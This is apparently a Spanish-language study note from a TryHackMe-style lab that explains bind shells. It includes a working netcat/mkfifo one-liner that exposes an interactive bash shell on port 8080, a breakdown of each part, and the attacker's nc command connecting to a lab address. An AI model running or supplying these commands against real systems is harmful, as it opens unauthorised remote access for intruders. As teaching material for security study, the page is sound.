---
layout: apunte
title: "4. Bind Shell"
---

Como indica su nombre, una bind shell se relaciona a un puerto en el sistema comprometido y escucha una conexión. Cuando ocurre, expone una sesión shell al atacante. 

Este método puede ser usado cuando el sistema comprometido no permite las conexiones salientes, pero es menos popular ya que necesita permanecer activo y escuchar conexiones, lo que puede llevar a su detección.

----------------------
<h2>¿Cómo funcionan las bind shells?</h2>

----------------------------

<h4>Configurar la Bind Shell en el Objetivo</h4>
Creemos una bind shell. El atacante puede usar un comando como el de abajo en la máquina objetivo:

`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f`

-  `rm -f /tmp/f`: Elimina cualquier archivo pipe existente en `/tmp/f`. Esto es para crear una nueva pipe ahí sin conflictos.
- `mkfifo /tmp/f`: Crea una pipe o FIFO (First In First Out) en `/tmp/f`.
- `cat /tmp/f`: Lee la información de la pipe (espera input).
- `| bash -i 2>&1`: El output de cat se pipea a la instancia de shell (`bash -i`), que permite al atacante ejecutar comandos de manera interactiva. El `2>&1` redirecciona los errores al output (stderr a stdout), asegurándose de que cualquier error se manda de vuelta al atacante.
- `| nc -l 0.0.0.0 8080`: Comienza la conexión en modo escucha (`-l`) en todas las interfaces (`0.0.0.0`) y el puerto `8080`.
- `>/tmp/f`: Esta parte manda el output de los comandos de vuelta hacia el pipe, permitiendo comunicación bidireccional.

Este comando escuchará conexiones entrantes y expondrá una shell bash. Los puertos por debajo del 1024 necesitan ser ejecutados con privilegios elevados.

------------------------
<h4>Terminal en la Máquina Objetivo (Bind Shell Setup)</h4>
```shell
target@tryhackme:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

Una vez ejecutado el comando, esperará por una conexión, como se muestra arriba.

-----------------------------
<h4>El Atacante se Conecta a la Bind Shell</h4>
Ahora que la máquina víctima está esperando conexiones, usamos Netcat de nuevo con el siguiente comando para conectarnos:

`nc -nv <IP_OBJETIVO> <PUERTO_OBJETIVO>`

- - `nc`: Llama a la herramienta Netcat.
- `-n`: Deshabilita la resolución DNS.
- `-v`: Activa verbose para obtener más información.
- `IP_OBJETIVO`: La dirección IP del objetivo donde la bind shell está corriendo.
- `PUERTO_OBJETIVO`: El puerto en el que el sistema objetivo escucha.

```shell
attacker@kali:~$ nc -nv 10.10.13.37 8080 
(UNKNOWN) [10.10.13.37] 8080 (http-alt) open
target@tryhackme:~$
```

